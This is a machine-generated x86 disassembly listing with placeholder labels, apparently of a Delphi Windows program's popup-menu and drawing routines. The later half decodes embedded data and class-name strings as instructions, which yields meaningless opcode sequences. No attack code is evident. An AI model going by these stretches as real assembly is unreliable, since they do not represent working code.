mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_420440
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_4202e0
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_449146
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_420440
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_432270
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_455080
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_447fc8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_447fc8
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_447fc8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_447ff8
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_416b18
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_447ff8
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_454d24
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_454d8c
jmp r-xdata
sub_449163
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_44921c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_4169bc
pop esi
pop ebx
retn
push ebx
push sub_448c8c
call sub_41d604
mov [ ebx + 0x10 ] eax
sub_449260
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_447de0
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_44921c
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4492d4
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_449244
mov edx ebx
and dl 0xfc
mov eax esi
call sub_447e7c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_44932c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_444178
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_448ae8
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_448ae8
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_449374
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_444178
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4538d0
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403360
mov edx eax
jmp r-xdata
sub_4493c0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_4156bc
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_44932c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_447734
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_447c30
mov eax [ ebx + 0x34 ]
call sub_444fd8
mov eax ebx
call sub_4485d8
mov eax ebx
call sub_449374
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_445108
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_449474
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_416b18
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_416b18
cmp ebp [ eax ]
jne r-xdata
sub_4494b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41fcc0
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_41f4f4
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_41fcc0
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_41f4f4
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403360
mov edx [ r-xdata ]
call sub_4032f0
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_41fcc0
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_41f4f4
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_449598
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403ef0
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_40415c
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4043fc
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_40415c
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4043fc
jmp r-xdata
sub_44962c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403e9c
mov ebx 0x1
mov eax esi
call sub_40415c
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404084
sub_449690
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4496e9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_449598
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_449598
mov eax [ ebp - 0x8 ]
pop edx
call sub_407d68
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4496f0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403ec0
retn
sub_4496f8
adc al [ eax ]
add [ eax ] al
rcr [ ebx + 0x1b80045 ] 0x1
inc esi
add ah cl
fwait
inc ebp
add [ eax + 0x1 ] bh
inc esi
add al cl
fwait
inc ebp
add [ ecx + eax ] ah
inc esi
add ah al
fwait
inc ebp
add [ eax + 0x1 ] bl
inc esi
add al al
fwait
inc ebp
add [ esp + eax ] ah
inc esi
add [ ebx + ebx * 4 + 0x1640045 ] bh
inc esi
add [ eax - 0x37ffba65 ] bh
add al [ esi ]
mov ah 0x9b
inc ebp
add [ eax + 0x2 ] al
inc esi
add [ eax - 0x4fffba65 ] dh
add al 0x46
add [ ebx + ebx * 4 + 0x4ac0045 ] ch
inc esi
add [ eax - 0x3ffba65 ] ch
add [ esi ] eax
movsb [ edi ] [ esi ]
fwait
inc ebp
add [ esp + eax + 0x46 ] ch
add [ eax + 0x2c00459b ] ah
add al 0x46
add [ ebx + ebx * 4 + 0x4fc0045 ] bl
inc esi
add [ eax - 0x33ffba65 ] bl
add al 0x46
add [ ebx + ebx * 4 + 0x20c0045 ] dl
inc esi
add [ eax + 0x1c00459b ] dl
add al [ esi ]
mov [ ebx + 0x2580045 ] ds
inc esi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4497f0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4497f7
retn
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
call sub_403164
mov eax [ rw-data ]
call sub_403164
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404918
mov eax rw-data
call sub_403e9c
sub_4497fc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4496f8
call sub_403c48
mov eax [ r-xdata ]
call sub_416354
mov eax [ r-xdata ]
call sub_4163f4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4163a0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4163a0
mov eax [ r-xdata ]
call sub_416298
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424fc0
mov [ rw-data ] eax
sub_4498e8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
cdq
inc esp
add [ 0x6d726f46 ] al
add [ eax - 0x57ffbe8f ] ah
jno r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx ] bh
inc eax
add [ eax + eax ] ah
add bh bh
clc
retn 0x44
add [ eax ] bl
mov esp 0x54110044
retn
outsd
outsb
push ebx
imul edi [ edx + 0x65 ] sub_41dab4
sub [ eax ] al
add bh bh
cmp al 0xc3
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax + eax ] 0x0
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
cwde
inc esp
add [ eax ] cl
add [ eax ] al
dec [ eax ]
add [ eax ] al
call [ eax ]
mov esp 0x44
jb r-xdata
rcl [ ecx + ebx * 4 + 0x44 ] 0x0
pop es
outsb
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
inc eax
les eax [ eax + eax - 0x2c ]
les eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push es
add [ 0x676e6152 ] al
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
outsd
outsb
je r-xdata
push esp
arpl [ ebx + 0x5 ] bp
inc esi
outsd
jb r-xdata
add [ eax + 0x8 ] al
add al [ eax ]
or [ ecx + 0x6e ] ecx
arpl [ edx + 0x65 ] si
insd
outsb
je r-xdata
add [ eax ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
[ 0x1ff0000 ]
cmp al 0x10
inc eax
add [ eax ] dh
add [ eax ] al
push [ esp + eax * 8 ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
add al 0x53
imul edi [ edx + 0x65 ] r-xdata
xor al 0x0
add bh bh
js r-xdata
inc eax
add [ edi ] bl
add [ eax ] al
[ edi ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
add [ eax ] al
[ eax - 0x3d ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
je r-xdata
push esp
cdq
inc esp
add [ edi ] al
jae r-xdata
cdq
inc esp
add [ ecx + ecx * 2 ] dh
inc ecx
add [ 0x6f460500 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add [ eax ] al
add [ edx ] cl
add [ ecx ] cl
push esp
push 0x53626d75
imul edi [ edx + 0x65 ] r-xdata
sbb eax 0x1dff0000
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ ebx + ebx * 4 ] bh
inc esp
add [ ebx ] al
or al 0x54
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
pop es
add [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] eax
add eax 0x6c797453
cmp al 0x10
inc eax
add [ eax ] bh
add [ eax ] al
call [ eax + 0x10044c4 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al [ eax ]
or [ eax + ebp * 2 + 0x75 ] edx
insd
bound edx [ ebx + 0x69 ]
jpe r-xdata
push ebx
insd
outsd
outsd
je r-xdata
outsb
je r-xdata
xor eax [ eax ]
test al 0x33
inc eax
add [ ebx + esi + 0x30fc0040 ] bl
inc eax
add [ eax ] bl
xor [ eax ] eax
nop
jo r-xdata
xor eax [ eax ]
movsb [ edi ] [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 4 ] bh
inc esp
add [ eax ] cl
add [ eax ] al
ror [ eax + 0x41 ] 0x0
xchg esp eax
xor eax [ eax ]
mov al [ 0xffffffffa4004033 ]
cdq
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 4 + 0x44 ] dl
jae r-xdata
add [ eax + 0x7c004033 ] ah
lds eax [ ecx ]
test al 0x33
inc eax
add [ eax - 0x6c ] ah
inc ebx
add ah bh
xor [ eax ] al
sbb [ ecx ] dh
inc eax
add [ edi + eax * 8 - 0x3bffffbc ] al
inc ebx
add [ eax ] ch
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] bh
fwait
inc esp
add [ eax ] cl
ja r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] dl
inc eax
add [ 0x1dff0000 ] bl
outsd
insb
outsd
jb r-xdata
inc ebx
add [ ebx + esi * 2 + 0x73b80043 ] cl
add ah bl
inc ebp
inc ebx
les eax [ ebx ]
sub [ ebx + eax * 2 + 0x4170bc00 ] cl
add [ ecx + esi * 2 + 0x45dc0043 ] bh
dec esi
outsd
jb r-xdata
add [ gs : eax ] dl
add eax 0x676e6152
adc [ eax ] al
or al 0x0
add bh bh
jo r-xdata
inc ebx
add ah bl
dec esi
inc ebx
add [ eax * 2 + 0x50680043 ] dl
inc ebx
add al ah
dec edi
inc ebx
add ah dh
push edx
inc ebx
add [ eax - 0x3ffbcaf ] ah
xchg edx eax
inc ebx
add [ esp + esi * 2 ] bh
inc ebx
add [ edi + esi * 4 ] bl
inc ebx
add al bl
mov bh 0x43
add ah dl
mov dl 0x43
add [ edi + esi * 4 - 0x31c3ffbd ] bh
inc esp
add [ eax ] dl
enter 0x44 0x88
lea eax [ ebx ]
rol bh 0x44
add [ eax - 0x76 ] dh
inc ebx
add al dl
mov [ eax + eax + 0x20 ] 0x2400438e
mov es [ ebx ]
fmul [ ebx + eax * 2 + 0x438c8400 ]
add ah bh
mov eax 0x96cc0043
inc ebx
add [ edx + ecx * 8 ] bh
inc ebx
add [ eax - 0x4b ] bh
inc ebx
add [ eax - 0x48 ] ch
inc ebx
add [ eax ] dh
enter 0x44 0xe0
0x44
add ah dh
dec esi
inc ebx
add [ eax - 0x34 ] al
add [ eax ] al
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax 0x6f500800
jae r-xdata
mov [ ebx ] es
mov esp 0xbc004170
jno r-xdata
mov [ eax + eax ] 0x280043c4
inc ebx
add [ eax + 0x44 ] dl
inc ebx
add [ eax - 0x4fffbc47 ] dl
mov ecx 0xb6c80043
inc ebx
add [ eax - 0x63ffbcbd ] bl
inc ebx
add ah bl
js r-xdata
fadd [ ebp + 0x43 ]
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
add [ eax ] al
je r-xdata
inc ecx
add [ eax ] ch
leave
inc ecx
add [ eax ] ah
leave
inc ecx
add [ eax - 0x34 ] cl
inc ecx
add [ edi + eax * 8 ] cl
inc esp
add [ edi + edi * 4 ] dl
inc ebx
add [ eax ] dh
les eax [ ebx ]
jl r-xdata
jae r-xdata
outsd
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
loopne r-xdata
ror ah 0x9b
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
pushfd
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x39ffbb64 ] ah
pushfd
inc esp
add [ edx + eax ] bl
add [ eax ] al
hlt
sub_449c9c
adc al 0xcd
inc esp
add [ esi ] al
add [ 0x15011400 ] al
add [ eax + esi * 4 ] edi
in al dx
inc eax
[ eax ]
int 0x44
add ah dh
int 0x44
add [ eax ] bl
into
inc esp
add [ esi + ecx * 8 - 0x330fffbc ] ch
inc esp
add [ eax - 0x38 ] dl
inc esp
add [ esp + edx * 2 ] dl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
push esi
jb r-xdata
outsd
insb
nop
loopne r-xdata
add [ ebx ] al
or al 0x54
inc edx
outsd
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
inc ebx
add [ esp + ecx * 4 - 0x4703ffbd ] al
inc ebx
add ah cl
xchg esi eax
inc ebx
add [ edx + ecx * 8 ] bh
inc ebx
add [ eax - 0x4b ] bh
inc ebx
add [ eax - 0x48 ] ch
inc ebx
add [ eax ] dh
enter 0x44 0xe0
0x44
inc esp
add [ edi ] al
adc al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
imul ebp [ esi + 0x67 ] 0x436e6957
outsd
outsb
je r-xdata
shl ecx 0x2
jb r-xdata
outsd
insb
popfd
inc esp
add [ ebx ] al
adc [ esi + eax * 2 + 0x6f ] dl
jb r-xdata
jb r-xdata
outsd
insb
int3
add [ ebx ] al
add [ eax ] al
add [ esi + ebx * 4 + 0x620c0044 ] bl
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
or [ ecx + 0x4f ] cl
je r-xdata
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
popfd
inc esp
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax - 0x63 ] bl
inc esp
add [ 0x6d726f46 ] al
inc edx
outsd
jb r-xdata
jb r-xdata
je r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x61afffc0 ]
add bh bh
insd
pop esp
adc [ eax ] eax
add ecx eax
loope r-xdata
inc esp
add [ ebx ] al
lea eax [ eax ]
push eax
sahf
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
jae r-xdata
add eax 0x58000000
inc eax
add ah ch
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
popfd
inc esp
add [ edi ] cl
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
lea eax [ eax ]
in al dx
popfd
inc esp
add [ esi ] al
bound esi [ ebx + 0x4e ]
outsd
outsb
or [ gs : edx + 0x73 ] ah
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x58000000 ] al
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
outsd
jb r-xdata
inc eax
add [ eax + 0x300449e ] ah
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
int 0xda
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
outsd
imul eax [ ebx + edx * 2 ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
dec eax
outsd
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
insb
inc esi
invd
dec ecx
dec edi
add bh bh
dec [ ebx + 0x449e20c0 ]
add [ edi ] cl
push cs
jo r-xdata
mov eax eax
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ esi + ebx * 4 + 0x44 ] cl
add [ eax ] cl
jae r-xdata
push eax
outsd
jb r-xdata
push ds
0xa34de72b 0xcc30
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
imul edi [ edx + 0x65 ] 0x6c6f6f54
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov al [ 0x900449f ]
inc esp
popa
jne r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
je r-xdata
je r-xdata
insd
inc esp
jae r-xdata
add [ eax ] al
add [ eax + 0x900449f ] ah
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
shl al 0x9e
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ edi + ebx * 4 ] al
inc esp
add [ edx ] cl
jo r-xdata
jb r-xdata
push es
add eax 0x6d726f46
jae r-xdata
nop
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
popad
dec ebp
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
dec ebp
insd
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
outsb
insb
arpl [ edi + 0x6e ] bp
jae r-xdata
lahf
inc esp
add [ esi ] al
jo r-xdata
inc eax
add [ eax + 0x80044a0 ] cl
or edx [ ebx + eax * 2 + 0x6c ]
insd
lahf
inc esp
add [ ebx ] al
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
